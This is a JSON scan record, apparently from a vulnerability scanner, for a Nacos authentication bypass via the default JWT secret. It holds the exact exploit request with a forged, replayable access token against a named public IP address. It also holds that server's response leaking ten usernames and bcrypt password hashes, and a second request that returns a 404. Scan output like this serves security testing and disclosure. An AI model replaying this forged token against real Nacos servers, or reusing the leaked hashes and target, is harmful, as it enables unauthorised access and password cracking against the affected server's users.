{
    "nacos-authentication-bypass": {
        "info": {
            "name": "Nacos < 2.2.0 - Authentication Bypass",
            "author": "Esonhugh",
            "severity": "critical",
            "description": "The authentication function of Nacos is can be bypass through default JWT secret.\n",
            "remediation": "Change value of jwt secret in the configurations",
            "reference": [
                "https://github.com/alibaba/nacos/issues/10060",
                "https://avd.aliyun.com/detail?id=AVD-2023-1655789",
                "https://nacos.io/zh-cn/docs/auth.html"
            ],
            "classification": {
                "cpe": "cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*"
            },
            "metadata": {
                "verified": true,
                "max-request": 2,
                "shodan-query": "title:\"Nacos\"",
                "product": "nacos",
                "vendor": "alibaba"
            },
            "tags": "auth-bypass,nacos,misconfig,jwt"
        },
        "targets": [
            {
                "target": "http://58.34.101.115:8848",
                "req_resp": [
                    {
                        "req": "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1\r\nHOST: 58.34.101.115\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                        "resp": "HTTP/1.1 200\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:29:47 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n{\"totalCount\":25,\"pageNumber\":1,\"pagesAvailable\":3,\"pageItems\":[{\"username\":\"0WR45K\",\"password\":\"$2a$10$OLwy867HEG4t.xnxMkI9H.3t/w7CEKz/IUR3fd32n4gd1VkeH0Pv.\"},{\"username\":\"2oRH5Zu5Re58fqwHUpzx5OlxPxA\",\"password\":\"$2a$10$cVeBnKC/skZBIiHcfzI7w.wV2A8TSf124/jsTvxtkXDEBeJIcfR5m\"},{\"username\":\"2tWP61hsKAZmHTmCHilN80VNpsC\",\"password\":\"$2a$10$nfA2.cRPyjqyWPJ5V8bkNe6iccQ88ixCk8OWi/N8Fw5Xzp8vB.pM2\"},{\"username\":\"asdfg\",\"password\":\"$2a$10$TSsUwVtY2gQaGCr9nh/ul.DgY.NrRA/t2l9Uq1/I8hSRacB7y8Jxi\"},{\"username\":\"ico\",\"password\":\"$2a$10$nt4vKeVyCx9Ir3R0i8V8tOqobogqpaqIqTxjkStbht4XMS3Uin/yi\"},{\"username\":\"KLP7FA\",\"password\":\"$2a$10$FO3KwbtRv7fOJk78DBeNm.boNcqjgPvEG7cRUVIm7CRrfLqAP6s7q\"},{\"username\":\"LR63YR\",\"password\":\"$2a$10$juE30DSSxBOAJ.0uLctmOu6.xWS/HxJRK3I806EnUvsqM2wzw.AmS\"},{\"username\":\"myworld0103\",\"password\":\"$2a$10$FOQv308UtscgPeVAE4hYnOjiGKADUrOJI34Gta8Up3KXLeubD9mqG\"},{\"username\":\"myworld9318\",\"password\":\"$2a$10$XnuqZVk0HTCh3huulpwWmeEqqkEZNp5BzXJ4.VzmxnBL8hh.9sWTS\"},{\"username\":\"nacos\",\"password\":\"$2a$10$bWzPgBlAeWRYI.d4EQkLb.Y9kzJdJ7oVcQbWhEDJgFoY5HPkgg4FC\"}]}"
                    },
                    {
                        "req": "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1\r\nHOST: 58.34.101.115\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
                        "resp": "HTTP/1.1 404\r\nContent-Type: text/html;charset=utf-8\r\nContent-Language: en\r\nContent-Length: 431\r\nDate: Fri, 21 Mar 2025 14:29:47 GMT\r\nKeep-Alive: timeout=60\r\nConnection: keep-alive\r\n\r\n<!doctype html><html lang=\"en\"><head><title>HTTP Status 404 – Not Found</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1></body></html>"
                    }
                ]
            }
        ]
    }
}